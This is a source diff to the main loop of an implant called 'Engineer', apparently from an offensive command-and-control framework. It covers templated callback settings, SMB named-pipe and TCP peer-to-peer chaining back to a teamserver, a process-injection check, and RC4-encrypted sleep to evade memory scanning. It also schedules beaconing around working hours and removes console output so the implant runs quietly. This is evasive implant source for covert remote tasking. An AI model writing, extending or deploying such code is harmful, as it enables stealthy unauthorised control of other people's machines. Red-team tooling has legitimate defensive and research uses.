@@ -18,7 +18,6 @@ namespace Engineer
     public class Program
     {
         public static EngCommBase _commModule;
-        // public static TCPCommModule _tcpCommModule;
         private static CancellationTokenSource _tokenSource;
         internal static EngineerMetadata _metadata;
         internal static WindowsIdentity ImpersonatedUser;
@@ -35,15 +34,12 @@ namespace Engineer
         private static string WorkHoursEnd = "{{REPLACE_WORK_HOURS_END}}";      // time of day an operation stops for the day 
         private static string WorkHoursStart = "{{REPLACE_WORK_HOURS_START}}"; // time of day an operation starts for that day
         public static bool IsEncrypted = false;
-        // public static string TeamserverVerificationKey =  "{{REPLACE_TEAMSERVER_KEY}}";
-       // public static string TeamserverVerificationMessage =  "{{REPLACE_TEAMSERVER_MESSAGE}}";
-       // public static string MetadataKey =  "{{REPLACE_UNIQUE_METADATA_KEY}}";
-       public static string UniqueTaskKey = "{{REPLACE_UNIQUE_TASK_KEY}}";
+        public static string UniqueTaskKey = "{{REPLACE_UNIQUE_TASK_KEY}}";
         public static string MessagePathKey = "{{REPLACE_MESSAGE_PATH_KEY}}";
         public static string MetadataKey = "{{REPLACE_METADATA_KEY}}";
         public static int P2PNumber = int.TryParse("{{REPLACE_P2P_NUMBER}}", out P2PNumber) ? P2PNumber : -1;
         public static bool IsTaskExecuting = false;
-        public static string SleepCode = "{{REPLACE_SLEEP_DLL}}";
+        public static SleepEnum.SleepTypes Sleeptype = Enum.TryParse("{{REPLACE_SLEEP_TYPE}}", out SleepEnum.SleepTypes sleeptype) ? sleeptype : SleepEnum.SleepTypes.None;
         public static DateTime LastP2PCheckIn = DateTime.Now;
 
         public static async Task Main(string[] args)
@@ -57,14 +53,14 @@ namespace Engineer
                     {
                         var sleep = int.Parse("{{REPLACE_SLEEP_TIME}}");
                         EngCommBase.Sleep = sleep * 1000;
-                        Console.WriteLine($"sleep time set to {EngCommBase.Sleep}");
+                       // Console.WriteLine($"sleep time set to {EngCommBase.Sleep}");
                         _commModule = new EngSMBComm("{{REPLACE_NAMED_PIPE}}",false); // child as server 
                     }
                     else if (!childIsServer)
                     {
                         var sleep = int.Parse("{{REPLACE_SLEEP_TIME}}");
                         EngCommBase.Sleep = sleep * 1000;
-                        Console.WriteLine($"sleep time set to {EngCommBase.Sleep}");
+                        //Console.WriteLine($"sleep time set to {EngCommBase.Sleep}");
                         _commModule = new EngSMBComm("{{REPLACE_NAMED_PIPE}}","{{REPLACE_CONNECTION_IP}}",false); // child as client
                     }
                 }
@@ -74,14 +70,14 @@ namespace Engineer
                     {
                         var sleep = int.Parse("{{REPLACE_SLEEP_TIME}}");
                         EngCommBase.Sleep = sleep * 1000;
-                        Console.WriteLine($"sleep time set to {EngCommBase.Sleep}");
+                        //Console.WriteLine($"sleep time set to {EngCommBase.Sleep}");
                         _commModule = new EngTCPComm(int.Parse("{{REPLACE_LISTEN_PORT}}"), bool.Parse("{{REPLACE_ISLOCALHOSTONLY}}"),false); // child as server 
                     }
                     else if(!childIsServer)
                     {
                         var sleep = int.Parse("{{REPLACE_SLEEP_TIME}}");
                         EngCommBase.Sleep = sleep * 1000;
-                        Console.WriteLine($"sleep time set to {EngCommBase.Sleep}");
+                        //Console.WriteLine($"sleep time set to {EngCommBase.Sleep}");
                         _commModule = new EngTCPComm(int.Parse("{{REPLACE_BIND_PORT}}"), "{{REPLACE_CONNECTION_IP}}", false); // child as client
                     }    
                 }
@@ -105,12 +101,12 @@ namespace Engineer
                 if (ManagerType.Equals("tcp", StringComparison.CurrentCultureIgnoreCase))
                 {
                     Task.Run(async() =>await _commModule.Start());
-                    Console.WriteLine("tcp engineer comms started");
+                    //Console.WriteLine("tcp engineer comms started");
                 }
                 else if (ManagerType.Equals("smb", StringComparison.CurrentCultureIgnoreCase))
                 {
                     Task.Run(async () => await _commModule.Start());
-                    Console.WriteLine("smb engineer comms started");
+                   // Console.WriteLine("smb engineer comms started");
                 }
 
                 bool isInjected = Functions.InjectionTest.Injection_Test();
@@ -152,7 +148,7 @@ namespace Engineer
                         }
                         while (!_commModule.P2POutbound.IsEmpty && ManagerType.Equals("tcp", StringComparison.CurrentCultureIgnoreCase))
                         {
-                            Console.WriteLine($"{DateTime.UtcNow} tcp engineer has p2p outbound to put in parents queue");
+                           // Console.WriteLine($"{DateTime.UtcNow} tcp engineer has p2p outbound to put in parents queue");
                             //if this child has a finished task result place it into the queue for the parent to pick up
                             EngTCPComm.ChildToParentData[TcpParentCommModules.Keys.ElementAt(0)].Enqueue(_commModule.P2POutbound.TryDequeue(out var data) ? data : null); 
                         }
@@ -163,48 +159,16 @@ namespace Engineer
                             EngSMBComm.ChildToParentData[SmbParentCommModules.Keys.ElementAt(0)].Enqueue(_commModule.P2POutbound.TryDequeue(out var data) ? data : null); 
                             if (EngSMBComm.ChildToParentData[SmbParentCommModules.Keys.ElementAt(0)].Count > 0)
                             {
-                                Console.WriteLine("smb engineer queued data for parent");
+                              //  Console.WriteLine("smb engineer queued data for parent");
                             }
                         }
                         //while the parent has data from a child send it to the ts
                         while (!_commModule.P2POutbound.IsEmpty && (ManagerType.Equals("http", StringComparison.CurrentCultureIgnoreCase) || ManagerType.Equals("https", StringComparison.CurrentCultureIgnoreCase)))
                         {
                             EngHttpComm test = (EngHttpComm)_commModule;
-                            Console.WriteLine($"{DateTime.UtcNow} http engineer has task response from tcp engineer and is sending to ts");
+                            //Console.WriteLine($"{DateTime.UtcNow} http engineer has task response from tcp engineer and is sending to ts");
                             await test.Postp2pData();
                         }
-
-                        // //if the EngCommBase.Sleep time has past then checkin with the server
-                        // if (DateTime.Now.Subtract(LastP2PCheckIn).TotalSeconds > (EngCommBase.Sleep/1000) && EngCommBase.Sleep >= 1000)
-                        // {
-                        //
-                        //     if (ManagerType.Equals("tcp", StringComparison.CurrentCultureIgnoreCase) &&
-                        //         _commModule.IsChildConnectedToParent && FirstCheckIn.firstCheckInDone ||
-                        //         ManagerType.Equals("smb", StringComparison.CurrentCultureIgnoreCase) &&
-                        //         _commModule.IsChildConnectedToParent && FirstCheckIn.firstCheckInDone)
-                        //     {
-                        //         //Console.WriteLine($"parent is connected? {_commModule.IsChildConnectedToParent}");
-                        //         string parentId = "";
-                        //         if (ManagerType.Equals("tcp", StringComparison.CurrentCultureIgnoreCase))
-                        //         {
-                        //             parentId = TcpParentCommModules.Keys.ElementAt(0);
-                        //         }
-                        //         else if (ManagerType.Equals("smb", StringComparison.CurrentCultureIgnoreCase))
-                        //         {
-                        //             parentId = SmbParentCommModules.Keys.ElementAt(0);
-                        //         }
-                        //
-                        //         var checkTask = new EngineerTask()
-                        //         {
-                        //             Id = Guid.NewGuid().ToString(), Command = "checkin",
-                        //             Arguments = new Dictionary<string, string>() { { "/parentid", parentId } },
-                        //             IsBlocking = false
-                        //         };
-                        //         InboundCommandsRec += 1;
-                        //         await Tasking.DealWithTask(checkTask);
-                        //     }
-                        //     LastP2PCheckIn = DateTime.Now;
-                        // }
                         
                         //if tasking.EngTaskResults contains any tasks with the status of running then IsTaskExecuting = true
                         if(Tasking.engTaskResultDic.Any(x => x.Value.Status == EngTaskStatus.Running))
@@ -216,23 +180,32 @@ namespace Engineer
                             IsTaskExecuting = false;
                         }
                         
+                        //meed to modify this so it can be interruppted, if another thread finishes a task or p2p data is ready to be sent it shouldnt have to keep waiting for the sleep time to finish
+                        if(IsTaskExecuting)
+                        {
+                            Thread.Sleep(EngCommBase.Sleep);
+                        }
 
                         //sleep and encrypt
                         if (!(IsTaskExecuting) && EngCommBase.Sleep > 1000 && !(isInjected) && EngTCPComm.IsDataInTransit == false && EngSMBComm.IsDataInTransit == false)
                         {
                             IsEncrypted = true;
-                            Functions.SleepEncrypt.ExecuteSleep(EngCommBase.Sleep); //if we did not recvData and we have no data to send sleep for a bit
+                            if (Sleeptype == SleepEnum.SleepTypes.Custom_RC4)
+                            {
+                                Functions.SleepEncrypt.ExecuteSleep(EngCommBase.Sleep); //if we did not recvData and we have no data to send sleep for a bit
+                            }
+                            else if(Sleeptype == SleepEnum.SleepTypes.None)
+                            {
+                                Thread.Sleep(EngCommBase.Sleep);
+                            }
                             IsEncrypted = false;
                         }
                         else if (!(IsTaskExecuting) && EngTCPComm.IsDataInTransit == false && EngSMBComm.IsDataInTransit == false)
                         {
                             Thread.Sleep(EngCommBase.Sleep);
                         }
-                        else if(IsTaskExecuting)
-                        {
-                            //should help with the cpu usage
-                            Thread.Sleep(10);
-                        }
+                        
+                        
                         
                         
                         //if WorkingHoursEnd equal UTCTimeNow then Sleep until WorkingHoursStart
@@ -242,11 +215,11 @@ namespace Engineer
                         {
                             if (DateTime.TryParse(WorkHoursEnd, out endHours))
                             {
-                                Console.WriteLine($"endHours is a valid time of {endHours}");
+                               // Console.WriteLine($"endHours is a valid time of {endHours}");
                             }
                             else
                             {
-                                Console.WriteLine($"DateTime unable to parse {WorkHoursEnd}");
+                               // Console.WriteLine($"DateTime unable to parse {WorkHoursEnd}");
                             }
 
                             if (endHours.Minute == DateTime.UtcNow.Minute)
@@ -254,23 +227,30 @@ namespace Engineer
                                 //while the current hour is not the start hour sleep
                                 while (DateTime.UtcNow.Minute != startHours.Minute)
                                 {
-                                    Functions.SleepEncrypt.ExecuteSleep(EngCommBase.Sleep);
+                                    if (Sleeptype == SleepEnum.SleepTypes.Custom_RC4)
+                                    {
+                                        Functions.SleepEncrypt.ExecuteSleep(EngCommBase.Sleep); //if we did not recvData and we have no data to send sleep for a bit
+                                    }
+                                    else if (Sleeptype == SleepEnum.SleepTypes.None)
+                                    {
+                                        Thread.Sleep(EngCommBase.Sleep);
+                                    }
                                 }
                             }
                         }
                     }
                     catch (Exception ex)
                     {
-                        Console.WriteLine(ex.Message);
-                        Console.WriteLine(ex.StackTrace);
+                       // Console.WriteLine(ex.Message);
+                       // Console.WriteLine(ex.StackTrace);
                     }
                 }
                 Stop();
             }
             catch (Exception e)
             {
-                Console.WriteLine(e.Message);
-                Console.WriteLine(e.StackTrace);
+               // Console.WriteLine(e.Message);
+               // Console.WriteLine(e.StackTrace);
             }
         }
 
